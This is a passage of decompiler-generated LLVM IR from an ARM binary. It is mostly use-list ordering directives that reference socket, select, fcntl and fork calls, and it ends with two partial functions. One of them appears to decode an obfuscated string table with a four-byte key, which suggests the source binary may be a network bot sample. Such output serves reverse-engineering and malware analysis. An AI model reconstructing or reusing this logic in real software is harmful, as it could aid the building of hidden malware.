  uselistorder i32* %r1.global-to-local, { 10, 11, 12, 13, 33, 34, 29, 30, 14, 15, 16, 25, 26, 31, 32, 1, 2, 3, 4, 5, 6, 7, 8, 9, 89, 87, 88, 17, 18, 19, 20, 21, 22, 23, 24, 27, 28, 90, 91, 0, 35, 36, 37, 38, 92, 93, 94, 95, 39, 40, 41, 43, 44, 42, 45, 46, 48, 47, 86, 96, 97, 98, 99, 100, 101, 102, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85 }
  uselistorder i32* %r0.global-to-local, { 31, 32, 34, 33, 35, 37, 36, 38, 39, 41, 40, 182, 183, 184, 109, 108, 42, 111, 110, 100, 102, 101, 113, 115, 116, 112, 117, 114, 44, 43, 45, 47, 46, 48, 50, 49, 51, 82, 81, 84, 83, 85, 86, 104, 103, 105, 2, 1, 3, 5, 4, 7, 6, 8, 9, 10, 11, 13, 12, 15, 14, 17, 16, 18, 19, 20, 21, 23, 22, 25, 24, 27, 26, 28, 29, 30, 186, 185, 53, 54, 56, 55, 57, 52, 58, 59, 60, 61, 63, 62, 65, 64, 67, 66, 68, 69, 70, 72, 71, 73, 75, 74, 77, 76, 78, 79, 80, 88, 87, 90, 89, 94, 91, 92, 93, 188, 187, 190, 189, 96, 95, 97, 98, 99, 107, 106, 120, 118, 192, 191, 193, 195, 194, 210, 196, 197, 198, 199, 126, 119, 121, 122, 123, 125, 124, 127, 130, 128, 129, 135, 131, 134, 132, 133, 136, 201, 200, 202, 203, 204, 206, 205, 207, 208, 209, 139, 137, 138, 141, 140, 142, 144, 143, 181, 145, 146, 147, 0, 148, 149, 151, 150, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 169, 168, 171, 170, 172, 176, 175, 173, 174, 177, 178, 179, 180 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 22, 7, 8, 9, 10, 11, 19, 20, 21, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ip.global-to-local, { 17, 18, 6, 19, 7, 14, 0, 2, 1, 4, 3, 5, 47, 8, 9, 10, 11, 12, 13, 46, 48, 15, 16, 45, 20, 21, 22, 23, 24, 25, 28, 26, 27, 29, 49, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_z.global-to-local, { 27, 28, 100, 227, 207, 215, 90, 91, 92, 93, 94, 29, 198, 31, 32, 33, 55, 56, 57, 74, 75, 76, 77, 78, 0, 1, 6, 7, 2, 3, 4, 5, 8, 9, 10, 15, 16, 11, 12, 13, 14, 17, 18, 19, 24, 25, 20, 21, 22, 23, 26, 211, 34, 35, 36, 37, 38, 43, 44, 39, 40, 41, 42, 45, 46, 47, 52, 53, 48, 49, 50, 51, 54, 58, 59, 63, 64, 60, 61, 62, 65, 213, 66, 71, 72, 67, 68, 69, 70, 73, 212, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 208, 209, 210, 226, 199, 95, 96, 97, 98, 99, 200, 214, 30, 216, 217, 218, 101, 103, 102, 104, 105, 107, 109, 108, 201, 106, 110, 111, 112, 113, 114, 115, 120, 116, 117, 118, 119, 204, 205, 202, 203, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 138, 139, 137, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 225, 153, 154, 224, 155, 156, 223, 157, 158, 222, 159, 160, 161, 197, 162, 221, 163, 164, 220, 165, 166, 219, 167, 168, 169, 170, 171, 196, 172, 173, 174, 175, 176, 195, 177, 178, 179, 194, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 206, 193 }
  uselistorder i1* %cpsr_c.global-to-local, { 27, 28, 29, 97, 223, 203, 211, 87, 88, 89, 90, 91, 30, 194, 31, 32, 33, 34, 55, 56, 57, 74, 75, 76, 77, 0, 1, 6, 7, 2, 3, 4, 5, 8, 9, 10, 15, 16, 11, 12, 13, 14, 17, 18, 19, 24, 25, 20, 21, 22, 23, 26, 207, 35, 36, 37, 38, 43, 44, 39, 40, 41, 42, 45, 46, 47, 52, 53, 48, 49, 50, 51, 54, 58, 59, 63, 64, 60, 61, 62, 65, 209, 66, 71, 72, 67, 68, 69, 70, 73, 208, 78, 79, 80, 81, 82, 83, 84, 85, 86, 204, 205, 206, 222, 195, 92, 93, 94, 95, 96, 196, 210, 193, 212, 213, 214, 98, 100, 99, 101, 103, 105, 104, 197, 102, 106, 107, 108, 109, 110, 115, 111, 112, 113, 114, 200, 201, 198, 116, 199, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 221, 144, 145, 220, 146, 147, 219, 148, 149, 218, 150, 151, 152, 192, 153, 217, 154, 155, 216, 156, 157, 215, 158, 159, 160, 161, 162, 191, 163, 164, 165, 166, 167, 190, 168, 169, 170, 189, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 202, 188 }
  uselistorder i32 (i8*)* @inet_addr, { 0, 1, 3, 2, 4 }
  uselistorder [15 x i8]* @global_var_12270.135, { 1, 0 }
  uselistorder i8 31, { 8, 2, 3, 0, 4, 5, 9, 10, 1, 6, 7 }
  uselistorder i32* (i32*, i32*, i32)* @memmove, { 1, 0, 2 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_1230c.259 to i32*), { 2, 4, 3, 1, 0, 6, 5 }
  uselistorder [3 x i8]* @global_var_1230c.259, { 1, 0 }
  uselistorder i8 58, { 4, 6, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 57, { 4, 6, 5, 3, 2, 1, 0 }
  uselistorder i8 62, { 4, 6, 5, 3, 2, 1, 0 }
  uselistorder i8 61, { 4, 6, 5, 3, 2, 1, 0 }
  uselistorder i8 37, { 3, 5, 4, 2, 1, 0 }
  uselistorder i8 34, { 4, 6, 5, 3, 2, 1, 0 }
  uselistorder i8 36, { 7, 8, 11, 12, 9, 10, 5, 6, 3, 4, 2, 0, 1 }
  uselistorder i8 35, { 8, 9, 12, 13, 10, 11, 6, 7, 4, 5, 2, 3, 0, 1 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @recv, { 5, 3, 4, 0, 1, 2, 6 }
  uselistorder i32 (i32)* @function_112dc, { 37, 10, 9, 36, 32, 40, 39, 38, 35, 34, 33, 31, 30, 29, 8, 7, 13, 28, 27, 26, 41, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 6, 5, 4, 3, 2, 1, 0, 12, 11 }
  uselistorder i32 (i32, i32, i32, i32)* @function_11aa0, { 4, 2, 3, 1, 0 }
  uselistorder i32 (i32, i32*)* @function_112b0, { 3, 4, 8, 0, 1, 2, 5, 6, 7, 35, 36, 31, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 37, 24, 25, 26, 27, 28, 29, 30, 32, 33, 34 }
  uselistorder i32 (i32)* @function_11394, { 28, 27, 23, 31, 30, 29, 26, 25, 24, 1, 0, 5, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 4, 3, 2 }
  uselistorder i8* bitcast (i8** @global_var_1a70c.190 to i8*), { 4, 0, 3, 2, 1 }
  uselistorder i8* @global_var_1a70d.191, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_fd_set*, %_TYPEDEF_fd_set*, %_TYPEDEF_fd_set*, %timeval*)* @select, { 1, 0, 2 }
  uselistorder i32 284, { 3, 4, 5, 0, 1, 2, 6, 7 }
  uselistorder i32* @r7, { 11, 12, 13, 17, 18, 19, 4, 8, 9, 10, 26, 14, 15, 16, 6, 20, 5, 21, 22, 23, 24, 25, 27, 3, 28, 29, 30, 160, 161, 162, 67, 68, 69, 70, 31, 0, 32, 33, 34, 35, 36, 37, 38, 39, 40, 7, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 127, 123, 124, 125, 126, 1, 128, 129, 130, 131, 132, 133, 138, 134, 135, 136, 137, 2, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 59, 60, 61, 62, 63, 64, 65, 66 }
  uselistorder i32 1536, { 1, 0 }
  uselistorder i32 1664, { 2, 0, 1 }
  uselistorder void (i32)* @exit, { 4, 6, 5, 2, 1, 0, 3, 7 }
  uselistorder i32* @r6, { 18, 47, 56, 57, 58, 59, 60, 61, 38, 19, 20, 62, 43, 63, 64, 65, 66, 67, 68, 21, 22, 23, 24, 25, 39, 44, 9, 10, 11, 12, 13, 14, 15, 16, 17, 48, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 40, 41, 42, 49, 50, 51, 52, 45, 46, 69, 70, 71, 72, 73, 53, 54, 74, 75, 7, 76, 77, 78, 79, 55, 271, 272, 273, 122, 123, 124, 125, 0, 80, 81, 82, 83, 84, 85, 86, 87, 88, 2, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 1, 106, 107, 108, 3, 109, 110, 126, 4, 127, 5, 128, 6, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 111, 114, 112, 113, 115, 116, 8, 117, 118, 119, 120, 121 }
  uselistorder i32 (i32, i32*, i32, i32)* @send, { 20, 6, 7, 9, 10, 8, 14, 15, 16, 17, 18, 28, 26, 30, 29, 21, 5, 4, 3, 2, 1, 0, 12, 19, 27, 25, 24, 23, 22, 11, 13, 31 }
  uselistorder i32 ()* @function_f928, { 3, 2, 1, 0 }
  uselistorder i32 254, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 5888, { 1, 0 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32, %sockaddr*, i32*)* @recvfrom, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32*, i32, i32, %sockaddr*, i32)* @sendto, { 0, 8, 1, 2, 7, 4, 6, 9, 5, 3, 10 }
  uselistorder i32 16384, { 13, 61, 12, 49, 0, 50, 1, 51, 2, 52, 3, 53, 4, 54, 5, 55, 6, 56, 7, 57, 8, 58, 29, 59, 30, 60, 27, 63, 28, 64, 25, 26, 62, 37, 72, 31, 65, 32, 66, 33, 67, 34, 68, 35, 69, 36, 70, 9, 71, 10, 73, 11, 74, 39, 75, 15, 76, 40, 77, 41, 78, 42, 79, 14, 80, 38, 81, 16, 82, 17, 83, 18, 84, 43, 44, 19, 85, 20, 86, 21, 87, 45, 88, 22, 89, 46, 90, 47, 48, 23, 91, 24, 92 }
  uselistorder i32 (i32, i32, i32, i32)* @function_de80, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_de24, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_1a6f0.248, { 2, 1, 0 }
  uselistorder i32 16711680, { 3, 0, 1, 2 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 33, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 28, { 2, 11, 3, 12, 4, 13, 6, 7, 8, 9, 10, 1, 14, 15, 16, 0, 5, 18, 17, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 27, { 3, 0, 1, 2, 4 }
  uselistorder i32 20, { 19, 20, 1, 21, 2, 22, 18, 23, 24, 12, 13, 14, 15, 26, 27, 3, 28, 29, 30, 31, 32, 33, 34, 4, 35, 36, 37, 38, 39, 40, 41, 42, 43, 5, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 6, 54, 55, 56, 57, 58, 59, 60, 61, 7, 62, 63, 64, 0, 65, 66, 67, 68, 16, 69, 70, 71, 72, 73, 74, 75, 76, 77, 17, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 9, 88, 8, 89, 90, 91, 92, 11, 93, 10, 94, 95, 96, 25 }
  uselistorder i32 -6, { 1, 0, 2, 3 }
  uselistorder i32 159, { 1, 0 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 18, { 4, 5, 0, 6, 1, 7, 2, 8, 3, 9 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 31, { 10, 9, 16, 17, 11, 12, 13, 14, 3, 15, 7, 8, 4, 0, 5, 1, 2, 6 }
  uselistorder i32 30, { 2, 9, 1, 8, 3, 10, 4, 11, 5, 12, 0, 13, 6, 7 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32* @fp, { 2, 3, 40, 41, 42, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 37, 38, 39, 43, 1, 44, 45, 46 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_122ec.242 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_122e4.240 to i32), { 0, 2, 1, 3 }
  uselistorder i32 11, { 11, 0, 8, 1, 9, 2, 10, 12, 13, 14, 3, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 4, 29, 30, 31, 5, 32, 33, 34, 6, 35, 36, 37, 7, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_122a8.228 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32, i32)* @function_f9fc, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_12314.220 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i8* @global_var_1a701.214, { 1, 0 }
  uselistorder i8 64, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1a6f4.205 to i32), { 3, 2, 4, 5, 0, 6, 1, 7, 8 }
  uselistorder i8* @global_var_1a700.206, { 1, 0 }
  uselistorder i32 40, { 0, 2, 3, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 ptrtoint (i32* @global_var_1a6e0.201 to i32), { 0, 2, 1, 4, 5, 3, 6, 7, 8, 9 }
  uselistorder i32 1024, { 1, 0 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 65280, { 34, 1, 17, 0, 2, 3, 35, 4, 36, 24, 25, 5, 37, 18, 26, 38, 39, 6, 7, 40, 19, 8, 41, 27, 20, 21, 28, 29, 30, 42, 43, 44, 45, 9, 10, 31, 32, 33, 46, 47, 48, 49, 11, 12, 50, 51, 13, 52, 14, 53, 54, 22, 55, 56, 15, 57, 58, 23, 59, 60, 16 }
  uselistorder i32 ()* @function_f6c4, { 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 2, 11, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 10, 9, 8, 7, 6, 5, 1, 0, 4, 3 }
  uselistorder i32 (i32, i32, i32, i32*, i32)* @setsockopt, { 2, 4, 3, 6, 5, 8, 7, 10, 9, 1, 0, 11 }
  uselistorder i32 2048, { 5, 0, 1, 2, 6, 4, 7, 3, 8, 9 }
  uselistorder i32 (i32, i32, ...)* @fcntl, { 1, 5, 0, 2, 4, 3, 8, 7, 6, 11, 10, 9, 12 }
  uselistorder i32* @global_var_1a734.199, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @r5, {}
  uselistorder i32* @global_var_1a730.197, { 1, 2, 3, 4, 0 }
  uselistorder i32* (i32, i32)* @calloc, { 28, 25, 24, 30, 29, 4, 1, 0, 3, 2, 27, 26, 5, 37, 14, 7, 6, 9, 8, 11, 10, 12, 39, 13, 38, 33, 16, 15, 18, 17, 19, 23, 22, 21, 20, 36, 35, 34, 32, 31, 40 }
  uselistorder i32 288, { 1, 2, 5, 6, 0, 7, 3, 4, 8 }
  uselistorder i32* @global_var_1a710.184, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32 (i32*)* @time, { 0, 2, 1, 4, 3, 7, 6, 5, 8, 9 }
  uselistorder i32 (i32)* @function_f71c, { 1, 0 }
  uselistorder i32* @global_var_1a714.104, { 4, 5, 1, 2, 3, 6, 0, 7, 15, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 ()* @function_11c94, { 2, 1, 0 }
  uselistorder i32 ()* @fork, { 3, 4, 6, 5, 2, 1, 0, 7 }
  uselistorder i32* @sl, { 0, 1, 2, 3, 4, 5, 6, 77, 78, 79, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* @sb, { 1, 2, 3, 0, 4, 5, 6, 7, 62, 63, 64, 8, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 65, 66, 67, 68, 69, 70, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r8, { 3, 79, 80, 81, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 1, 44, 45, 46, 47, 48, 49, 50, 51, 0, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 2, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 82, 83, 84, 85, 86, 87, 88, 89, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_10810.backedge.thread501, { 9, 2, 8, 4, 7, 3, 6, 1, 5, 0 }
  uselistorder label %dec_label_pc_10810.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_111d8, { 1, 0 }
  uselistorder label %.thread241, { 1, 0 }
  uselistorder label %bb378, { 1, 0 }
  uselistorder label %dec_label_pc_11114, { 1, 0 }
  uselistorder label %dec_label_pc_110e0, { 1, 0 }
  uselistorder label %thread-pre-split100, { 1, 0 }
  uselistorder label %dec_label_pc_10ff0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10f1c, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10f08, { 1, 0 }
  uselistorder label %dec_label_pc_10e68, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10e54, { 1, 0 }
  uselistorder label %dec_label_pc_10db4, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10da0, { 1, 0 }
  uselistorder label %dec_label_pc_10d48, { 4, 5, 1, 2, 3, 11, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_10c58, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10c44, { 1, 0 }
  uselistorder label %dec_label_pc_10b30, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10b1c, { 1, 0 }
  uselistorder label %dec_label_pc_10a90, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10a7c, { 1, 0 }
  uselistorder label %dec_label_pc_10a0c, { 1, 0 }
  uselistorder label %dec_label_pc_109f0, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_109dc, { 1, 0 }
  uselistorder label %dec_label_pc_10998, { 4, 1, 2, 3, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_10988, { 5, 2, 3, 4, 1, 0 }
  uselistorder label %.thread90, { 2, 0, 1 }
  uselistorder label %.thread88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10924, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_108e0, { 1, 0 }
  uselistorder label %dec_label_pc_108e0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10874, { 1, 0 }
  uselistorder label %bb347, { 1, 0 }
  uselistorder label %dec_label_pc_10828, { 1, 0 }
  uselistorder label %dec_label_pc_10818, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10818.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1080c.loopexit, { 2, 5, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1076c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10644, { 1, 7, 8, 4, 5, 0, 6, 2, 3 }
  uselistorder label %dec_label_pc_1061c, { 1, 0 }
  uselistorder label %bb339, { 1, 0 }
  uselistorder label %bb337, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_1046c.dec_label_pc_1046c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10454.dec_label_pc_10454_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1044c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10444, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10360, { 1, 0 }
  uselistorder label %dec_label_pc_10204, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_101f8, { 1, 0 }
  uselistorder label %.thread68, { 2, 1, 0 }
  uselistorder label %.thread66, { 1, 0 }
  uselistorder label %bb320, { 1, 0 }
  uselistorder label %dec_label_pc_10068.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1005c.thread, { 1, 0 }
  uselistorder label %dec_label_pc_10050.thread, { 1, 0 }
  uselistorder label %dec_label_pc_10038, { 1, 0 }
  uselistorder label %.thread38, { 1, 0 }
  uselistorder label %dec_label_pc_ffdc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ffb8, { 1, 0 }
  uselistorder label %dec_label_pc_ffac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ff88, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ff64, { 1, 0 }
  uselistorder label %bb300, { 1, 0 }
  uselistorder label %dec_label_pc_ff10, { 30, 6, 10, 2, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 17, 18, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 31 }
  uselistorder label %dec_label_pc_fcd4, { 1, 0 }
}

define i32 @function_112b0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_112b0:
  %v3_112b4 = mul i32 %arg1, 8
  %v2_112b8 = add i32 %v3_112b4, ptrtoint (i32* @global_var_1a740.266 to i32)
  %v2_112bc = icmp eq i32* %arg2, null
  br i1 %v2_112bc, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_112b0
  %v3_112c811 = inttoptr i32 %v2_112b8 to i32*
  %v4_112c812 = load i32, i32* %v3_112c811, align 4
  br label %bb15

bb:                                               ; preds = %dec_label_pc_112b0
  %v2_112c0 = add i32 %v3_112b4, add (i32 ptrtoint (i32* @global_var_1a740.266 to i32), i32 5)
  %v3_112c0 = inttoptr i32 %v2_112c0 to i8*
  %v4_112c0 = load i8, i8* %v3_112c0, align 1
  %v5_112c0 = zext i8 %v4_112c0 to i32
  %v2_112c4 = add i32 %v3_112b4, add (i32 ptrtoint (i32* @global_var_1a740.266 to i32), i32 4)
  %v3_112c4 = inttoptr i32 %v2_112c4 to i8*
  %v4_112c4 = load i8, i8* %v3_112c4, align 4
  %v5_112c4 = zext i8 %v4_112c4 to i32
  %v3_112c8 = inttoptr i32 %v2_112b8 to i32*
  %v4_112c8 = load i32, i32* %v3_112c8, align 4
  %v5_112cc = mul nuw nsw i32 %v5_112c0, 256
  %v6_112cc = or i32 %v5_112c4, %v5_112cc
  store i32 %v6_112cc, i32* %arg2, align 4
  br label %bb15

bb15:                                             ; preds = %.thread, %bb
  %v4_112c8714 = phi i32 [ %v4_112c812, %.thread ], [ %v4_112c8, %bb ]
  ret i32 %v4_112c8714

; uselistorder directives
  uselistorder i32 %v2_112b8, { 1, 0 }
  uselistorder i32 %v3_112b4, { 2, 1, 0 }
  uselistorder i32* null, { 4, 8, 5, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 20, 21, 2, 6, 3, 7, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_112dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_112dc:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_112dc = mul i32 %arg1, 8
  %v3_112e0 = load i32, i32* @r4, align 4
  store i32 %v3_112e0, i32* %stack_var_-20, align 4
  %v3_112f0 = and i32 %v3_112dc, 2040
  %v2_112f4 = add i32 %v3_112f0, ptrtoint (i32* @global_var_1a740.266 to i32)
  store i32 %v2_112f4, i32* %lr.global-to-local, align 4
  %v1_112fc = add i32 %v3_112f0, add (i32 ptrtoint (i32* @global_var_1a740.266 to i32), i32 4)
  store i32 %v1_112fc, i32* %r7.global-to-local, align 4
  %v2_11300 = load i32, i32* @global_var_1a698.269, align 4
  store i32 %v2_11300, i32* @r2, align 4
  %v2_11304 = inttoptr i32 %v1_112fc to i8*
  %v3_11304 = load i8, i8* %v2_11304, align 4
  %v4_11304 = zext i8 %v3_11304 to i32
  store i32 %v4_11304, i32* @r1, align 4
  %v1_11308 = add i32 %v3_112f0, add (i32 ptrtoint (i32* @global_var_1a740.266 to i32), i32 5)
  %v2_11308 = inttoptr i32 %v1_11308 to i8*
  %v3_11308 = load i8, i8* %v2_11308, align 1
  %v4_11308 = zext i8 %v3_11308 to i32
  %v3_1130c = udiv i32 %v2_11300, 256
  %v4_11310 = mul nuw nsw i32 %v4_11308, 256
  %v5_11310 = or i32 %v4_11310, %v4_11304
  %v7_11310 = icmp eq i32 %v5_11310, 0
  store i1 %v7_11310, i1* @cpsr_z, align 1
  %v3_11314 = udiv i32 %v2_11300, 65536
  %v1_11318 = urem i32 %v3_1130c, 256
  store i32 %v1_11318, i32* %r6.global-to-local, align 4
  %v1_1131c = urem i32 %v3_11314, 256
  store i32 %v1_1131c, i32* %r5.global-to-local, align 4
  %v3_11320 = udiv i32 %v2_11300, 16777216
  store i32 %v3_11320, i32* %r4.global-to-local, align 4
  %v1_11324 = urem i32 %v2_11300, 256
  br i1 %v7_11310, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_112dc
  store i32 %v3_112e0, i32* @r4, align 4
  ret i32 %v1_11324

bb8:                                              ; preds = %dec_label_pc_112dc
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11330

dec_label_pc_11330:                               ; preds = %dec_label_pc_11330, %bb8
  %v2_1133c = phi i32 [ %v1_11378, %dec_label_pc_11330 ], [ 0, %bb8 ]
  %v0_11330 = phi i32 [ %v0_11370, %dec_label_pc_11330 ], [ %v2_112f4, %bb8 ]
  %v1_11330 = inttoptr i32 %v0_11330 to i32*
  %v2_11330 = load i32, i32* %v1_11330, align 4
  %v2_11334 = add i32 %v2_11330, %v2_1133c
